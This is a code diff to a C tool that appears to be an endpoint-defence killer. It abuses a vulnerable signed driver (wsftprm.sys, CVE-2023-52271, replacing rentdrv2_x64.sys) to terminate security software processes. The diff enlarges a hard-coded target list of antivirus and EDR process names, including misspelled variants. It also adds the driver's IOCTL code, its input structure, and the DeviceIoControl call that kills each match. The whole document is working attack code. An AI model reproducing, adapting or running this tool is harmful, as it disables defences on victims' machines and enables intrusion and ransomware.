@@ -9,29 +9,61 @@
 // AswArPot.sys - anti-rootkit driver by Avast
 //#define IOCTL_TERMINATE_PROCESS 0x9988c094
 
-// rentdrv2_x64.sys
-#define IOCTL_TERMINATE_PROCESS 0x22E010
+// rentdrv2_x64.sys (does not work on Windows 11)
+//#define IOCTL_TERMINATE_PROCESS 0x22E010
+
+// wsftprm.sys 2.0.0.0 Topaz Antifraud (CVE-2023-52271)
+#define IOCTL_TERMINATE_PROCESS 0x22201C
+
 #pragma pack ( 1 )
 
 const char* g_serviceName = "sys-mon";
 
 const char* const g_avedrlist[] = {
-"activeconsole","anti malware","anti virus","anti-malware","anti-virus","antimalware","antivirus","appsense","authtap","avast","avecto","bdredline","canary","carbon black","carbonblack","cb.exe","cisco amp","ciscoamp","configsecuritypolicy","countercept","countertack","cramtray","crowdstrike","crssvc","csagent","csfalcon","csshell","cybereason","cyclorama","cylance","cyoptics","cyserver","cytray","cyupdate","cyvera","darktrace","defender","defendpoint","eectrl","elastic","elastic-agent","endgame","epconsole","ephost","epintegrationservices","epprotectedservice","epsecurityservice","epupdateservice","f-secure","fireeye","forcepoint","groundling","GRRservic","healthservice","inspector","ivanti","kaspersky","lacuna","logrhythm","malware","mandiant","mcafee","monitoringhost","morphisec","mpcmdrun","mpdefendercoreservice","mpdlpcmd","msascuil","msmpeng","msmpeng","mssense","nissrv","nissrv","omni","omniagent","osquery","palo alto networks","pgeposervice","pgsystemtray","privilegeguard","procwall","protectorservic","qradar","redcloak","secureworks","securityhealthservice","securityhealthsystray","semlaunchsv","sensece","sensecm","sensecncproxy","senseir","sensendr","sensesampleuploader","sensesc","sentinel","sepliveupdat","sisidsservice","sisipsservice","sisipsutil","smartscreen","smc.exe","smcgui","snac64","sophos","splunk","srtsp","symantec","symcorpu","symefasi","sysinternal","sysmon","tanium","tda.exe","tdawork","testcloudconnection","threat","tpython","vectra","wincollect","windowssensor","wireshark","xagt.exe","xagtnotif.exe"
+"activeconsoe","activeconsole","acuna","anti malware","anti maware",
+"anti virus","anti-malware","anti-maware","anti-virus","antimalware",
+"antimaware","antivirus","appsense","authtap","avast","avecto","bdredline",
+"canary","carbon back","carbon black","carbonback","carbonblack","cb.exe",
+"cisco amp","ciscoamp","configsecuritypolicy","countercept","countertack",
+"cramtray","crowdstrike","crssvc","csagent","csfacon","csfalcon","csfalconservice",
+"csshe","csshell","cyance","cybereason","cyclorama","cycorama","cylance","cyoptics",
+"cyserver","cytray","cyupdate","cyvera","darktrace","defender","defendpoint","eastic",
+"eectr","eectrl","elastic","elastic-agent","elastic-endpoint","endgame","epconsole",
+"ephost","epintegrationservices","epprotectedservice","epsecurityservice","epupdateservice",
+"f-secure","filebeat","fireeye","forcepoint","grounding","groundling","grrservic",
+"healthservice","inspector","ivanti","kaspersky","lacuna","logrhythm","malware",
+"mandiant","maware","mcafee","metricbeat","monitoringhost","morphisec","mpcmdrun",
+"mpdefendercoreservice","mpdlpcmd","msascui","msascuil","msmpeng","mssense","nissrv",
+"ogrhythm","omni","omniagent","osquery","palo alto networks","pao ato networks",
+"pgeposervice","pgsystemtray","priviegeguard","privilegeguard","procwa","procwall",
+"protectorservic","qradar","redcloak","redcoak","secureworks","securityhealthservice",
+"securityhealthsystray","securityheathservice","semaunchsv","semlaunchsv","sensece",
+"sensecm","sensecncproxy","senseir","sensendr","sensesampleuploader","sensesc",
+"sensetvm","sentine","sentinel","sepiveupdat","sepliveupdat","sisidsservice","sisipsservice",
+"sisipsuti","sisipsutil","smartscreen","smc.exe","smcgui","snac64","sophos","splunk","spunk",
+"srtsp","symantec","symcorpu","symefasi","sysinterna","sysinternal","sysmon","tanium",
+"tda.exe","tdawork","testcloudconnection","threat","tpython","vectra","wincoect",
+"wincollect","windowssensor","winlogbeat","wireshark","xagt.exe","xagtnotif.exe"
 };
 
 int g_avedrlistSize = sizeof(g_avedrlist) / sizeof(g_avedrlist[0]);
 
+/* rentdrv2_x64.sys
 typedef struct RentDrivStruct {
-/*
-    1 - Kill a process by PID
-    2 - Kill a process by name
-    3 - Kill a process and childs by the parent process name
- */
+    //1 - Kill a process by PID
+    //2 - Kill a process by name
+    //3 - Kill a process and childs by the parent process name
  UINT level; // Required field !
  SIZE_T pid; // Optional based on level
  wchar_t path[1024]; // Optional based on level
 } _RentDrivStruct, * PRentDrivStruct;
+*/
 
+// wsftprm.sys
+typedef struct _wsftprmDrivStruct {
+	DWORD pPID;
+	BYTE bPadding[1032];
+} wsftprmDrivStruct;
 
 BOOL loadDriver(char* driverPath) {
 	SC_HANDLE hSCM, hService;
@@ -115,10 +147,13 @@ int isInavEdrlist(const char* pn) {
 }
 
 DWORD checkEDRProcesses(HANDLE hDevice) {
-	unsigned int procId = 0;
-	unsigned int pOutbuff = 0;
+	//unsigned int procId = 0;
+	DWORD procId = 0;
+	//unsigned int pOutbuff = 0;
+	DWORD pOutbuff = 0;
 	DWORD bytesRet = 0;
-	int ecount = 0;
+	//int ecount = 0;
+	DWORD ecount = 0;
 	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
 	if (hSnap != INVALID_HANDLE_VALUE) {
@@ -131,18 +166,28 @@ DWORD checkEDRProcesses(HANDLE hDevice) {
 				wcstombs(exeName, pE.szExeFile, MAX_PATH);
 
 				if (isInavEdrlist(exeName)) {
-					procId = (unsigned int)pE.th32ProcessID;
+					//procId = (unsigned int)pE.th32ProcessID;
+					procId = pE.th32ProcessID; // DWORD
 
 					// rentdrv2_x64.sys
-					RentDrivStruct driverIoctl;
-					
-					driverIoctl.level = 1;
-					driverIoctl.pid = procId;
+					//RentDrivStruct driverIoctl;
+					//driverIoctl.level = 1;
+					//driverIoctl.pid = procId;
+					// 
+					////if (!DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, &procId, sizeof(procId), &pOutbuff, sizeof(pOutbuff), &bytesRet, NULL))
+					//if (!DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, &driverIoctl, sizeof(RentDrivStruct), NULL, NULL, NULL, NULL))
 
-					//if (!DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, &procId, sizeof(procId), &pOutbuff, sizeof(pOutbuff), &bytesRet, NULL))
-					if (!DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, &driverIoctl, sizeof(RentDrivStruct), NULL, NULL, NULL, NULL))
+
+					// wsftprm.sys
+					wsftprmDrivStruct driverIoctl;
+					driverIoctl.pPID = procId;
+
+					if (!DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, &driverIoctl, sizeof(wsftprmDrivStruct), &pOutbuff, sizeof(pOutbuff), &bytesRet, NULL)) {
 						printf("failed to terminate %ws !!!\n", pE.szExeFile);
-					else {
+						DWORD err = GetLastError();
+						wprintf(L"[!] DeviceIoControl failed for PID %lu, GLE=%lu (0x%08lx)\n", procId, err, err);
+
+					} else {
 						printf("terminated %ws\n", pE.szExeFile);
 						ecount++;
 					}
@@ -191,7 +236,10 @@ int main(void) {
 	// HANDLE hDevice = CreateFile(L"\\\\.\\aswSP_Avar", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	// rentdrv2_x64.sys
-	HANDLE hDevice = CreateFile(L"\\\\.\\rentdrv2", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
+	//HANDLE hDevice = CreateFile(L"\\\\.\\rentdrv2", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
+
+	// wsftprm.sys
+	HANDLE hDevice = CreateFileW(L"\\\\.\\Warsaw_PM", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
 
 	if (hDevice == INVALID_HANDLE_VALUE) {
 		printf("Failed to open handle to the driver!!!");
